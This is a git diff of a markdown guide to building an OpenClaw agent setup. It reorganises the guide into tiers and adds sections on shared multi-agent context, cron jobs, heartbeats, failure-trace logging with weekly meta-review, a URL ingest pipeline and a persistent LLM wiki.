@@ -4,6 +4,16 @@
 
 This guide assumes a fresh OpenClaw install. Every upgrade below was built and battle-tested over ~6 weeks (Feb–Mar 2026). Follow in order — later systems depend on earlier ones.
 
+The guide is organized into 14 phases across 5 tiers, plus appendices:
+
+| Tier | Phases | Focus |
+|------|--------|-------|
+| Foundation | 1–3 | Memory, search, multi-agent coordination |
+| Automation & Ops | 4–7 | Cron jobs, compaction, heartbeat, monitoring |
+| Knowledge | 8–9 | Knowledge base, wiki, cross-agent synthesis |
+| Intelligence & Quality | 10–12 | Skills, build harness, agentic memory |
+| Hardening & Integration | 13–14 | Task ops, email, security |
+
 ---
 
 ## Prerequisites
@@ -13,6 +23,10 @@ This guide assumes a fresh OpenClaw install. Every upgrade below was built and b
 - At least one channel connected (Telegram, WhatsApp, Discord, etc.)
 - Python 3.10+ available
 - An Obsidian vault (optional, for Second Brain features)
+
+---
+
+# Tier 1: Foundation
 
 ---
 
@@ -182,7 +196,7 @@ chmod +x tools/ensure-daily-log.sh
 
 ---
 
-## Phase 2: Vector Memory (Semantic Search)
+## Phase 2: Vector Memory & Semantic Search
 
 This gives your agent the ability to semantically search all memory files — not just grep, but *meaning-based* retrieval.
 
@@ -399,11 +413,185 @@ cd /path/to/workspace/tools/vector-memory && source venv/bin/activate && python3
 
 ---
 
-## Phase 3: Hourly Summarizer + Context Injection
+## Phase 3: Shared Brain & Multi-Agent Coordination
+
+If you run multiple cron jobs or sub-agents, they need a shared context plane.
+
+### 3.1 Directory Structure
+
+```
+shared-context/
+├── priorities.md          # Current priority stack (human-maintained)
+├── agent-outputs/         # Each agent/cron writes its output here
+│   ├── general/           # Main session daily summaries
+│   ├── trading/           # Trading agent outputs
+│   └── [agent-name]/      # Other agent outputs
+├── feedback/              # Structured feedback on agent outputs
+├── kpis/                  # Key metrics
+├── calendar/              # Upcoming events
+├── content-calendar/      # Content publishing schedule
+└── roundtable/            # Cross-agent synthesis (auto-generated)
+    └── latest.md
+```
+
+### 3.2 Priorities File
+
+`shared-context/priorities.md` — maintain this yourself:
+
+```markdown
+# Current Priorities
+
+**Last Updated:** [date]
+
+### 1. [Top Priority]
+- **Status:** [status]
+- **Next:** [next step]
+
+### 2. [Second Priority]
+- **Status:** [status]
+
+### 3. [Third Priority]
+- **Status:** [status]
+```
+
+### 3.3 Feedback Logger — `tools/feedback-logger.py`
+
+```python
+#!/usr/bin/env python3
+"""
+Feedback Logger — structured approve/reject for agent outputs.
+Usage:
+    python3 feedback-logger.py approve "agent-name" "reason"
+    python3 feedback-logger.py reject "agent-name" "reason"
+"""
+
+import json, os, sys
+from datetime import datetime, timezone
+
+FEEDBACK_DIR = "/path/to/workspace/shared-context/feedback"  # ← Change
+
+def log_feedback(action, agent, reason):
+    os.makedirs(FEEDBACK_DIR, exist_ok=True)
+    
+    year, week, _ = datetime.now(timezone.utc).isocalendar()
+    week_str = f"{year}-W{week:02d}"
+    filepath = os.path.join(FEEDBACK_DIR, f"feedback-{week_str}.json")
+    
+    # Load or create
+    data = {"week": week_str, "entries": []}
+    if os.path.exists(filepath):
+        with open(filepath) as f:
+            data = json.load(f)
+    
+    data["entries"].append({
+        "timestamp": datetime.now(timezone.utc).isoformat(),
+        "action": action,
+        "agent": agent,
+        "reason": reason
+    })
+    
+    with open(filepath, 'w') as f:
+        json.dump(data, f, indent=2)
+    
+    print(f"✓ Logged {action} for {agent}: {reason}")
+
+if __name__ == '__main__':
+    if len(sys.argv) < 4:
+        print("Usage: python3 feedback-logger.py [approve|reject] 'agent' 'reason'")
+        sys.exit(1)
+    log_feedback(sys.argv[1], sys.argv[2], sys.argv[3])
+```
+
+### 3.4 Daily Summaries for Cross-Agent Visibility
+
+Add this instruction to AGENTS.md (or to your heartbeat):
+
+```markdown
+## Daily Summary
+Once per day, write a brief summary of today's main session work to:
+  shared-context/agent-outputs/general/YYYY-MM-DD-daily-summary.md
+This ensures cron agents (Roundtable, Forge) can see what happened.
+```
+
+---
+
+# Tier 2: Automation & Ops
+
+---
+
+## Phase 4: Cron Jobs & Scheduling
+
+This is where the system comes alive. Cron jobs are OpenClaw's native scheduled tasks — they run as isolated sessions on a schedule.
+
+### 4.1 Core Crons
+
+Set these up via `openclaw cron add`:
+
+```bash
+# Hourly memory summarizer (keeps context fresh)
+openclaw cron add \
+  --name "hourly-memory-summarizer" \
+  --every "55 * * * *" \
+  --model "anthropic/claude-sonnet-4-6" \
+  --task "Run: python3 /path/to/workspace/tools/hourly-summarizer.py && python3 /path/to/workspace/tools/context-injector.py"
+
+# Vector memory reindex (every 4 hours)
+openclaw cron add \
+  --name "vector-memory-reindex" \
+  --every "0 */4 * * *" \
+  --model "anthropic/claude-sonnet-4-6" \
+  --task "Run: cd /path/to/workspace/tools/vector-memory && source venv/bin/activate && python3 ingest.py"
+
+# Daily roundtable (9 PM, cross-agent synthesis)
+openclaw cron add \
+  --name "daily-roundtable" \
+  --every "0 21 * * *" \
+  --tz "America/Chicago" \
+  --model "anthropic/claude-sonnet-4-6" \
+  --task "Run: python3 /path/to/workspace/tools/roundtable.py"
+
+# Weekly memory compound (Sunday 10 PM)
+openclaw cron add \
+  --name "weekly-memory-compound" \
+  --every "0 22 * * 0" \
+  --tz "America/Chicago" \
+  --model "anthropic/claude-sonnet-4-6" \
+  --task "Run: python3 /path/to/workspace/tools/weekly-compound.py"
+```
+
+### 4.2 Morning Brief (optional but powerful)
+
+A daily briefing cron that researches and delivers a personalized morning update:
+
+```bash
+openclaw cron add \
+  --name "morning-brief" \
+  --every "0 7 * * *" \
+  --tz "America/Chicago" \
+  --model "anthropic/claude-sonnet-4-6" \
+  --task "Research and deliver a morning brief covering: [your topics — crypto, markets, geopolitics, AI news, etc.]. Search the web for the latest. Send the brief to the user via Telegram."
+```
+
+### 4.3 Cost Optimization for Crons
+
+**Critical:** Route all background crons to a cheaper model. Direct conversations use your best model (e.g., Opus), but crons should use Sonnet:
+
+- Set `payload.model` to `anthropic/claude-sonnet-4-6` on every cron
+- Set `heartbeat.model` to `anthropic/claude-sonnet-4-6` in config
+- Enable prompt caching: `cacheControlTtl: "1h"` in config
+- **Estimated savings: 40-60% on background costs**
+
+---
+
+## Phase 5: Memory Compaction Pipeline (Hourly + Weekly)
+
+This phase combines two complementary systems: the hourly summarizer that captures what happened each hour and injects it into session context, and the weekly compound that distills daily logs into clean summaries. Together they form a continuous memory compaction pipeline.
+
+### 5A: Hourly Summarizer + Context Injection
 
 These two scripts work together: the summarizer captures what happened each hour, and the context injector compiles recent context into a single file that survives session compaction.
 
-### 3.1 Hourly Summarizer — `tools/hourly-summarizer.py`
+#### 5A.1 Hourly Summarizer — `tools/hourly-summarizer.py`
 
 This script reads recent OpenClaw session transcripts and writes structured hourly summaries:
 
@@ -488,7 +676,7 @@ if __name__ == '__main__':
         print("No active session found.")
 ```
 
-### 3.2 Context Injector — `tools/context-injector.py`
+#### 5A.2 Context Injector — `tools/context-injector.py`
 
 Compiles recent hourly summaries, priorities, and active tasks into a single `CONTEXT_INJECTION.md` that the agent reads on session start:
 
@@ -551,179 +739,82 @@ if __name__ == '__main__':
     compile_context()
 ```
 
----
+### 5B: Weekly Memory Compound
 
-## Phase 4: Shared Brain (Multi-Agent Coordination)
+Runs Sunday night. Distills the week's daily logs into a concise weekly summary.
 
-If you run multiple cron jobs or sub-agents, they need a shared context plane.
+#### 5B.1 `tools/weekly-compound.py`
 
-### 4.1 Directory Structure
-
-```
-shared-context/
-├── priorities.md          # Current priority stack (human-maintained)
-├── agent-outputs/         # Each agent/cron writes its output here
-│   ├── general/           # Main session daily summaries
-│   ├── trading/           # Trading agent outputs
-│   └── [agent-name]/      # Other agent outputs
-├── feedback/              # Structured feedback on agent outputs
-├── kpis/                  # Key metrics
-├── calendar/              # Upcoming events
-├── content-calendar/      # Content publishing schedule
-└── roundtable/            # Cross-agent synthesis (auto-generated)
-    └── latest.md
-```
-
-### 4.2 Priorities File
-
-`shared-context/priorities.md` — maintain this yourself:
-
-```markdown
-# Current Priorities
-
-**Last Updated:** [date]
-
-### 1. [Top Priority]
-- **Status:** [status]
-- **Next:** [next step]
-
-### 2. [Second Priority]
-- **Status:** [status]
-
-### 3. [Third Priority]
-- **Status:** [status]
-```
-
-### 4.3 Feedback Logger — `tools/feedback-logger.py`
-
-```python
-#!/usr/bin/env python3
-"""
-Feedback Logger — structured approve/reject for agent outputs.
-Usage:
-    python3 feedback-logger.py approve "agent-name" "reason"
-    python3 feedback-logger.py reject "agent-name" "reason"
-"""
-
-import json, os, sys
-from datetime import datetime, timezone
-
-FEEDBACK_DIR = "/path/to/workspace/shared-context/feedback"  # ← Change
-
-def log_feedback(action, agent, reason):
-    os.makedirs(FEEDBACK_DIR, exist_ok=True)
-    
-    year, week, _ = datetime.now(timezone.utc).isocalendar()
-    week_str = f"{year}-W{week:02d}"
-    filepath = os.path.join(FEEDBACK_DIR, f"feedback-{week_str}.json")
-    
-    # Load or create
-    data = {"week": week_str, "entries": []}
-    if os.path.exists(filepath):
-        with open(filepath) as f:
-            data = json.load(f)
-    
-    data["entries"].append({
-        "timestamp": datetime.now(timezone.utc).isoformat(),
-        "action": action,
-        "agent": agent,
-        "reason": reason
-    })
-    
-    with open(filepath, 'w') as f:
-        json.dump(data, f, indent=2)
-    
-    print(f"✓ Logged {action} for {agent}: {reason}")
-
-if __name__ == '__main__':
-    if len(sys.argv) < 4:
-        print("Usage: python3 feedback-logger.py [approve|reject] 'agent' 'reason'")
-        sys.exit(1)
-    log_feedback(sys.argv[1], sys.argv[2], sys.argv[3])
-```
-
-### 4.4 Daily Summaries for Cross-Agent Visibility
-
-Add this instruction to AGENTS.md (or to your heartbeat):
-
-```markdown
-## Daily Summary
-Once per day, write a brief summary of today's main session work to:
-  shared-context/agent-outputs/general/YYYY-MM-DD-daily-summary.md
-This ensures cron agents (Roundtable, Forge) can see what happened.
-```
-
----
-
-## Phase 5: Cron Jobs
-
-This is where the system comes alive. Cron jobs are OpenClaw's native scheduled tasks — they run as isolated sessions on a schedule.
-
-### 5.1 Core Crons
-
-Set these up via `openclaw cron add`:
+Core logic:
+- Reads all `memory/YYYY-MM-DD.md` files from the past 7 days
+- Reads `shared-context/feedback/` for the week
+- Reads hourly summaries
+- Writes a distilled `memory/weekly/YYYY-WXX.md`
+- Optionally updates MEMORY.md with significant learnings
 
 ```bash
-# Hourly memory summarizer (keeps context fresh)
-openclaw cron add \
-  --name "hourly-memory-summarizer" \
-  --every "55 * * * *" \
-  --model "anthropic/claude-sonnet-4-6" \
-  --task "Run: python3 /path/to/workspace/tools/hourly-summarizer.py && python3 /path/to/workspace/tools/context-injector.py"
-
-# Vector memory reindex (every 4 hours)
-openclaw cron add \
-  --name "vector-memory-reindex" \
-  --every "0 */4 * * *" \
-  --model "anthropic/claude-sonnet-4-6" \
-  --task "Run: cd /path/to/workspace/tools/vector-memory && source venv/bin/activate && python3 ingest.py"
-
-# Daily roundtable (9 PM, cross-agent synthesis)
-openclaw cron add \
-  --name "daily-roundtable" \
-  --every "0 21 * * *" \
-  --tz "America/Chicago" \
-  --model "anthropic/claude-sonnet-4-6" \
-  --task "Run: python3 /path/to/workspace/tools/roundtable.py"
-
-# Weekly memory compound (Sunday 10 PM)
 openclaw cron add \
   --name "weekly-memory-compound" \
   --every "0 22 * * 0" \
   --tz "America/Chicago" \
   --model "anthropic/claude-sonnet-4-6" \
-  --task "Run: python3 /path/to/workspace/tools/weekly-compound.py"
+  --task "Run: python3 /path/to/workspace/tools/weekly-compound.py. Then review the output and update MEMORY.md if there are significant learnings worth keeping long-term."
 ```
-
-### 5.2 Morning Brief (optional but powerful)
-
-A daily briefing cron that researches and delivers a personalized morning update:
-
-```bash
-openclaw cron add \
-  --name "morning-brief" \
-  --every "0 7 * * *" \
-  --tz "America/Chicago" \
-  --model "anthropic/claude-sonnet-4-6" \
-  --task "Research and deliver a morning brief covering: [your topics — crypto, markets, geopolitics, AI news, etc.]. Search the web for the latest. Send the brief to the user via Telegram."
-```
-
-### 5.3 Cost Optimization for Crons
-
-**Critical:** Route all background crons to a cheaper model. Direct conversations use your best model (e.g., Opus), but crons should use Sonnet:
-
-- Set `payload.model` to `anthropic/claude-sonnet-4-6` on every cron
-- Set `heartbeat.model` to `anthropic/claude-sonnet-4-6` in config
-- Enable prompt caching: `cacheControlTtl: "1h"` in config
-- **Estimated savings: 40-60% on background costs**
 
 ---
 
-## Phase 6: Monitoring & Observability (Forge)
+## Phase 6: Heartbeat System
+
+Heartbeats are periodic check-ins (default every 30 min). Instead of just replying "HEARTBEAT_OK", make them productive.
+
+### 6.1 HEARTBEAT.md
+
+```markdown
+# HEARTBEAT.md
+
+## Vector Memory Maintenance
+- If memory files were updated since last check, run vector memory reindex
+- Track in memory/heartbeat-state.json under "lastVectorReindex"
+
+## Daily Memory Log Stub
+- After 10pm, check if memory/YYYY-MM-DD.md exists for today
+- If not, run: bash tools/ensure-daily-log.sh
+- Also backfill yesterday if missing
+
+## Decision Review Check
+- Weekly, scan decisions/*.md for any past review_date
+- If a decision's review_date has passed, flag it for user review
+
+## Daily Summary
+- Once per day, between 9pm-midnight, write today's summary to:
+  shared-context/agent-outputs/general/YYYY-MM-DD-daily-summary.md
+```
+
+### 6.2 heartbeat-state.json
+
+Track what's been checked to avoid redundant work:
+
+```json
+{
+  "lastChecks": {},
+  "lastVectorReindex": 0,
+  "lastDailySummary": 0,
+  "lastDailyLogCheck": 0,
+  "lastDecisionReview": 0
+}
+```
+
+---
+
+## Phase 7: Monitoring, Failure Analysis & Meta-Review
+
+This phase combines two deeply connected systems: Forge (the meta-agent that monitors the entire system, catches failures, and diagnoses root causes) and the failure trace / meta-review pipeline (which upgrades episode logging from "what happened" to "why it happened, what caused failures, and whether the approach is reusable"). Together they form a closed loop: Forge detects problems, failure traces capture the details, and the meta-review synthesizes patterns into actionable improvements.
+
+### 7A: Forge — Monitoring & Observability
 
 Forge is a meta-agent that monitors the entire system. It catches failures, diagnoses root causes, and applies fixes automatically.
 
-### 6.1 Forge Daily Review
+#### 7A.1 Forge Daily Review
 
 Create `tools/forge/daily-review.md` — this is the prompt/instructions for the daily review cron:
 
@@ -760,7 +851,7 @@ openclaw cron add \
   --task "Read tools/forge/daily-review.md and follow its instructions exactly."
 ```
 
-### 6.2 Forge Weekly Synthesis
+#### 7A.2 Forge Weekly Synthesis
 
 Create `tools/forge/weekly-synthesis.md`:
 
@@ -791,7 +882,7 @@ openclaw cron add \
   --task "Read tools/forge/weekly-synthesis.md and follow its instructions exactly."
 ```
 
-### 6.3 Pattern Database
+#### 7A.3 Pattern Database
 
 Create `memory/trace-analysis/pattern-database.md`:
 
@@ -805,13 +896,397 @@ Maintained by Forge. Each pattern includes occurrence count and resolution statu
 (Forge will populate this automatically as it discovers patterns)
 ```
 
+### 7B: Failure Traces, Generalizability Scoring & Meta-Agent Review
+
+Phase 12 gives your agent episodic memory — structured logs of what it did and whether it worked. But logging outcomes alone isn't enough. Research from Kevin Gu's AutoAgent project (1.2M impressions, #1 on SpreadsheetBench and TerminalBench) proved that **traces are everything**: when a meta-agent only received success/failure scores without reasoning traces, its improvement rate dropped dramatically.
+
+This section upgrades your episodic memory from "what happened" to "why it happened, what caused failures, what fixed them, and whether the approach is worth reusing."
+
+#### Why This Matters
+
+Without failure traces, your agent repeats the same mistakes. It knows a task failed but not *why*. Without generalizability scoring, it accumulates approaches without knowing which ones transfer to new situations vs. which are one-off hacks. Without a meta-review loop, no one analyzes the patterns.
+
+With this section:
+- Every failure is a documented lesson with root cause and fix
+- Every approach is tagged as reusable or task-specific
+- A weekly meta-agent reviews all episodes and recommends improvements to your agent's skills and instructions
+
+#### 7B.1 Failure Trace Logging
+
+Upgrade your episode logger to accept three new fields:
+
+```bash
+bash tools/episodic-memory/episode-logger.sh \
+  --task "Deploy app to Vercel" \
+  --approach "Used vercel CLI with --prod flag" \
+  --outcome "success" \
+  --duration "15m" \
+  --quality "0.85" \
+  --tags "vercel,deploy" \
+  --failure-trace "POST /api/mail/ingest returned HTML instead of JSON" \
+  --root-cause "Vite configureServer middleware only runs in dev. Production needs serverless functions." \
+  --fix-applied "Created api/mail/ingest.ts as Vercel serverless function" \
+  --generalizable "yes" \
+  --notes "Any Vite dev-only API needs a parallel serverless function for production"
+```
+
+**New fields:**
+
+| Field | Purpose |
+|-------|--------|
+| `--failure-trace` | What went wrong — the error message, unexpected behavior, or symptom |
+| `--root-cause` | Why it happened — the underlying cause, not just the symptom |
+| `--fix-applied` | What fixed it — the specific change that resolved the issue |
+| `--generalizable` | `yes` or `no` — is this approach reusable across similar tasks? |
+
+These fields are stored in the episode JSON and appended to the human-readable `index.md` with badges:
+- (reusable) = generalizable approach
+- (task-specific) = don't try to reuse
+
+**Implementation:** Add the new flags to your episode logger's argument parser. Store them as nullable fields in the JSON — `null` when not provided, so existing episodes remain compatible:
+
+```json
+{
+  "id": "ep-20260403-064816-fix-mail-scan-ocr",
+  "task": "Fix mail scan OCR on Vercel production",
+  "outcome": "success",
+  "failure_trace": "POST returned HTML instead of JSON",
+  "root_cause": "Vite middleware only runs in dev mode",
+  "fix_applied": "Created Vercel serverless function",
+  "generalizable": true
+}
+```
+
+#### 7B.2 The Generalizability Check
+
+Inspired by AutoAgent's overfitting problem — their meta-agent got lazy, gaming metrics with rubric-specific hacks instead of genuine improvements. Their fix: force self-reflection.
+
+When logging an episode, the generalizability flag answers one question:
+
+> *"If this exact task disappeared tomorrow, would this approach still be a worthwhile improvement?"*
+
+- **Yes (reusable)** — The approach transfers. Example: "Always create a Vercel serverless function for any POST endpoint" is useful for every future deployment.
+- **No (task-specific)** — The approach is a one-off. Example: "Renamed a specific CSS class to fix a layout bug" only matters for that component.
+
+Add to AGENTS.md:
+
+```markdown
+### Generalizability Check
+After completing a task, before logging the episode, ask yourself:
+"If this exact task disappeared, would this approach still be worthwhile?"
+- If yes: --generalizable yes (consider codifying into a skill)
+- If no: --generalizable no (document but don't try to systematize)
+```
+
+Over time, your episode index becomes a curated library of proven approaches tagged by reusability.
+
+#### 7B.3 Weekly Meta-Agent Review
+
+Create a meta-review script that analyzes recent episodes and generates actionable recommendations:
+
+**`tools/episodic-memory/meta-review.sh`:**
+
+```bash
+#!/usr/bin/env bash
+# Usage: bash tools/episodic-memory/meta-review.sh --days 7 --output stdout
+```
+
+The script:
+1. Collects all episode JSON files from the last N days
+2. Calculates success rate, failure count, trace coverage
+3. Groups failure patterns by root cause
+4. Identifies high-quality approaches (>=0.90) worth codifying
+5. Flags low-quality episodes (<=0.60) for review
+6. Counts generalizable vs task-specific approaches
+7. Generates recommendations
+
+**What it reports:**
+
+```markdown
+# Meta-Agent Review — 2026-04-03
+
+**Period:** Last 7 days | **Episodes:** 11 | **Success rate:** 72%
+
+## Recommendations
+- Improve trace coverage: 0/3 non-success episodes have failure traces
+- Score generalizability: 11/11 episodes missing --generalizable flag
+- Review failure patterns below for repeated root causes
+- 3 generalizable approaches found — consider codifying into skills
+
+## Failure Patterns
+- **Migrate cron jobs** (failure)
+  - Root cause: OpenClaw cron has different semantics
+
+## High Quality Approaches (>=0.90)
+- Build Puck Tracker real-time scoring (0.92) — SSE pattern
+- Exchange Building STR revenue tracking (0.91) — Supabase views
+
+## Generalizable Approaches Worth Codifying
+- Vercel serverless function pattern for Vite POST endpoints
+- Multi-agent parallel builds for complex feature sets
+```
+
+**Recommendations the meta-agent generates:**
+
+| Signal | Recommendation |
+|--------|---------------|
+| Low trace coverage | "All failures should include --failure-trace and --root-cause" |
+| Repeated root causes | "Add to lessons-learned.md or create preventive checks" |
+| 3+ generalizable approaches | "Consider codifying into reusable skill files" |
+| Success rate < 70% | "Review failure patterns, add guardrails to AGENTS.md" |
+| Missing generalizability flags | "Tag approaches as reusable or task-specific" |
+
+#### 7B.4 Integration
+
+**HEARTBEAT.md** — Add weekly meta-review:
+
+```markdown
+## Meta-Agent Episode Review
+- Weekly (Sundays), run: `bash tools/episodic-memory/meta-review.sh --days 7 --output stdout`
+- If recommendations found, review and act on them
+- If success rate < 70%, flag for user review
+- Track in memory/heartbeat-state.json under "lastMetaReview"
+```
+
+**AGENTS.md** — Update episode logging instructions:
+
+```markdown
+### Episodic Memory — Log What Worked (and What Didn't)
+After completing significant tasks, log an episode with:
+- --task, --approach, --outcome, --quality (always)
+- --failure-trace, --root-cause, --fix-applied (on any non-success)
+- --generalizable yes/no (always — ask: "would this approach matter if this task disappeared?")
+```
+
+**Cron job** (optional) — Automate the weekly review:
+
+```bash
+openclaw cron add \
+  --name "meta-review" \
+  --schedule "0 10 * * 0" \
+  --task "Run bash tools/episodic-memory/meta-review.sh --days 7 --output stdout. Summarize findings. If there are actionable recommendations, implement the top 1-2. Update lessons-learned.md with any new failure patterns."
+```
+
+#### 7B.5 Benefits Analysis
+
+| Before (Phase 12 only) | After (Phase 7 complete) | Impact |
+|--------------------|-------------------|--------|
+| Episodes log success/failure | Episodes log *why* things failed + what fixed them | Failures become reusable knowledge, not just noise |
+| All approaches treated equally | Generalizable vs task-specific tagging | Agent knows which patterns to reuse vs ignore |
+| No systematic review | Weekly meta-agent analyzes patterns | Continuous improvement loop — agent gets better over time |
+| Failure patterns stay in daily logs | Root causes extracted and grouped | Repeated failures get caught and prevented |
+| High-quality approaches undiscovered | Meta-review surfaces approaches worth codifying | Best practices naturally emerge into skills |
+
+**The key insight from AutoAgent:** Agents are better at understanding agents than we are. By giving your agent its own failure traces to analyze, it develops what Kevin Gu calls "model empathy" — an implicit understanding of its own limitations and tendencies. The meta-review loop operationalizes this: the agent reads its own reasoning traces, understands failure modes as part of its worldview, and corrects them.
+
+Same-model pairings win. Your meta-agent (reviewing episodes) and your task agent (doing the work) should run on the same model. The meta-agent writes improvements the task agent actually understands because they share the same weights.
+
 ---
 
-## Phase 7: Cross-Agent Synthesis (Roundtable)
+# Tier 3: Knowledge
+
+---
+
+## Phase 8: Knowledge Base — Ingest, Wiki & Obsidian
+
+This phase combines the content ingestion pipeline (URL-to-knowledge) with the persistent LLM Wiki (Karpathy pattern) and Obsidian integration. Together they form a unified knowledge system: sources come in through ingest, get processed into wiki pages, and are accessible through Obsidian's graph view.
+
+### 8A: Brain-Ingest Pipeline
+
+#### 8A.1 Brain-Ingest — `tools/brain-ingest/brain-ingest.sh`
+
+A pipeline that takes any URL (YouTube, articles, podcasts) and:
+1. Downloads the content
+2. Transcribes audio/video via Whisper
+3. Extracts key claims and structured knowledge
+4. Pushes to 3 targets: Obsidian vault, `memory/ingested/`, and FAISS vector index
+
+```bash
+#!/usr/bin/env bash
+# brain-ingest — Extract structured knowledge from video/audio/articles
+# Usage:
+#   brain-ingest "https://youtube.com/watch?v=..."
+#   brain-ingest --vault silverleafe --category research "URL"
+
+set -euo pipefail
+
+WORKSPACE="/path/to/workspace"  # ← Change
+VECTOR_DIR="$WORKSPACE/tools/vector-memory"
+
+# Map your Obsidian vaults
+declare -A VAULTS=(
+  ["main"]="/path/to/your/obsidian/vault"  # ← Change
+)
+
+VAULT_KEY="main"
+CATEGORY="research"
+INPUT=""
+
+while [[ $# -gt 0 ]]; do
+  case "$1" in
+    --vault) VAULT_KEY="$2"; shift 2 ;;
+    --category) CATEGORY="$2"; shift 2 ;;
+    *) INPUT="$1"; shift ;;
+  esac
+done
+
+VAULT_PATH="${VAULTS[$VAULT_KEY]}"
+
+# Step 1: Download/transcribe (use yt-dlp + whisper for video, or web_fetch for articles)
+# Step 2: Extract claims via LLM
+# Step 3: Write to Obsidian vault
+# Step 4: Write to memory/ingested/
+# Step 5: Reindex vector memory
+
+echo "brain-ingest: Processing $INPUT → $VAULT_PATH/$CATEGORY/"
+# ... implement based on your content types
+```
+
+#### 8A.2 Skill File — `skills/brain-ingest/SKILL.md`
+
+Create a skill file so the agent knows how to use brain-ingest in conversation:
+
+```markdown
+# brain-ingest Skill
+
+## When to Use
+When the user shares a URL (YouTube, article, podcast) and wants it captured in their knowledge base.
+
+## Usage
+bash tools/brain-ingest/brain-ingest.sh "URL"
+
+## Options
+- `--vault [name]` — target Obsidian vault
+- `--category [name]` — subfolder in vault
+
+## Output
+- Obsidian note with frontmatter, key claims, and summary
+- Copy in memory/ingested/
+- Auto-reindexed in vector memory
+```
+
+### 8B: LLM Wiki — Persistent Knowledge Base (Karpathy Pattern)
+
+Inspired by Andrej Karpathy's "llm-wiki" gist (2026). The core problem: most agents treat knowledge like RAG — re-discover from scratch on every query. Nothing accumulates. Ask a question that requires synthesizing five documents, and the agent pieces fragments together every time.
+
+This section builds a **persistent, compounding wiki** — structured, interlinked markdown files that the agent maintains. When you add a new source, the agent doesn't just index it. It reads it, extracts key information, and **integrates it into existing wiki pages** — updating entities, revising summaries, flagging contradictions.
+
+#### 8B.1 Three Layers
+
+| Layer | What It Is | Who Maintains It |
+|-------|-----------|------------------|
+| **Raw Sources** | `memory/ingested/` — articles, papers, transcripts | Immutable. Agent reads but never modifies. |
+| **The Wiki** | `memory/wiki/entities/` + `memory/wiki/concepts/` | Agent owns entirely. Creates, updates, cross-references. |
+| **The Schema** | `AGENTS.md` instructions | You and the agent co-evolve. |
+
+#### 8B.2 Wiki Structure
+
+```
+memory/wiki/
+├── entities/           # People, companies, projects, tools
+│   ├── exchange-building.md
+│   ├── hyperliquid.md
+│   ├── silverleafe.md
+│   ├── openclaw.md
+│   └── ...
+├── concepts/           # Ideas, patterns, strategies
+│   ├── agentic-memory.md
+│   ├── multi-agent-coordination.md
+│   ├── prompt-injection-defense.md
+│   └── ...
+├── index.md            # Master catalog with one-line summaries
+├── log.md              # Chronological operations log
+└── lint-report.md      # Latest health check results
+```
+
+Each wiki page has:
+- YAML frontmatter (type, created, updated, sources, related)
+- Summary section
+- Details organized by topic
+- Cross-references using `[[wikilinks]]` (Obsidian-compatible)
+- Source history (which ingests contributed to this page)
+
+#### 8B.3 Operations
+
+**Ingest:** Drop a new source → agent reads it → extracts entities/concepts → updates existing wiki pages or creates new ones → updates index → appends to log. A single source can touch 10-15 wiki pages.
+
+```bash
+# Process a new source into the wiki:
+bash tools/wiki/ingest-to-wiki.sh memory/ingested/2026-04-05-some-article.md
+```
+
+**Query:** Search wiki first for answers. Good answers get filed back as new wiki pages — explorations compound just like ingested sources.
+
+**Lint:** Health-check the wiki periodically:
+
+```bash
+bash tools/wiki/lint.sh
+```
+
+Checks for:
+- **Orphan pages** — wiki pages with no inbound links
+- **Missing entities** — terms mentioned 3+ times but lacking their own page
+- **Stale pages** — not updated in 30+ days
+- **Broken cross-references** — `[[links]]` pointing to non-existent pages
+- **Low-source pages** — only 1 source (weak evidence base)
+
+#### 8B.4 Contradiction Detection
+
+When new information arrives, check if it conflicts with existing wiki pages:
+
+```bash
+bash tools/wiki/check-contradictions.sh
+```
+
+Flags:
+- Price/number claims that differ between pages
+- Status claims that conflict (one page says "active", another says "blocked")
+- Date claims that are inconsistent
+- Stale financial data from older sources
+
+#### 8B.5 Integration
+
+**AGENTS.md** — Add to boot sequence:
+```markdown
+After ingesting new information, update relevant wiki entity/concept pages.
+When answering research questions, check wiki pages first, then file good answers back.
+```
+
+**HEARTBEAT.md** — Monthly wiki lint:
+```markdown
+## Wiki Health Check
+- Monthly: run bash tools/wiki/lint.sh
+- Check for orphan pages, stale claims, missing entities
+- Track in memory/heartbeat-state.json under "lastWikiLint"
+```
+
+**Obsidian** — The wiki uses `[[wikilinks]]` throughout, so opening `memory/wiki/` in Obsidian gives you a full graph view of your knowledge base with all cross-references visualized.
+
+#### 8B.6 Key Insight
+
+From Karpathy: *"The tedious part of maintaining a knowledge base is not the reading or the thinking — it's the bookkeeping. Updating cross-references, keeping summaries current, noting when new data contradicts old claims. Humans abandon wikis because the maintenance burden grows faster than the value. LLMs don't get bored and can touch 15 files in one pass."*
+
+The human's job: curate sources, direct analysis, ask good questions, think about what it means.
+The agent's job: everything else.
+
+#### 8B.7 Benefits
+
+| Before | After |
+|--------|-------|
+| Ingested articles sit as standalone files | Each ingest updates entity/concept pages across the wiki |
+| No cross-referencing between sources | `[[wikilinks]]` connect related knowledge automatically |
+| Contradictions go unnoticed | Contradiction detector flags conflicting claims |
+| Stale info stays forever | Lint catches outdated pages, low-source claims |
+| Knowledge scatters | Knowledge compounds — richer with every source added |
+| Ask the same synthetic question repeatedly | Synthesis exists as persistent wiki pages |
+
+---
+
+## Phase 9: Cross-Agent Synthesis (Roundtable)
 
 The roundtable script reads all agent outputs from the last 24 hours, extracts entities (people, companies, tickers, countries), detects cross-agent themes, and writes a daily synthesis.
 
-### 7.1 Roundtable — `tools/roundtable.py`
+### 9.1 Roundtable — `tools/roundtable.py`
 
 Key features of the roundtable:
 - Scans `shared-context/agent-outputs/` and recent `memory/` files
@@ -910,150 +1385,11 @@ if __name__ == '__main__':
 
 ---
 
-## Phase 8: Weekly Memory Compound
-
-Runs Sunday night. Distills the week's daily logs into a concise weekly summary.
-
-### 8.1 `tools/weekly-compound.py`
-
-Core logic:
-- Reads all `memory/YYYY-MM-DD.md` files from the past 7 days
-- Reads `shared-context/feedback/` for the week
-- Reads hourly summaries
-- Writes a distilled `memory/weekly/YYYY-WXX.md`
-- Optionally updates MEMORY.md with significant learnings
-
-```bash
-openclaw cron add \
-  --name "weekly-memory-compound" \
-  --every "0 22 * * 0" \
-  --tz "America/Chicago" \
-  --model "anthropic/claude-sonnet-4-6" \
-  --task "Run: python3 /path/to/workspace/tools/weekly-compound.py. Then review the output and update MEMORY.md if there are significant learnings worth keeping long-term."
-```
+# Tier 4: Intelligence & Quality
 
 ---
 
-## Phase 9: Obsidian as Second Brain
-
-### 9.1 Brain-Ingest Pipeline — `tools/brain-ingest/brain-ingest.sh`
-
-A pipeline that takes any URL (YouTube, articles, podcasts) and:
-1. Downloads the content
-2. Transcribes audio/video via Whisper
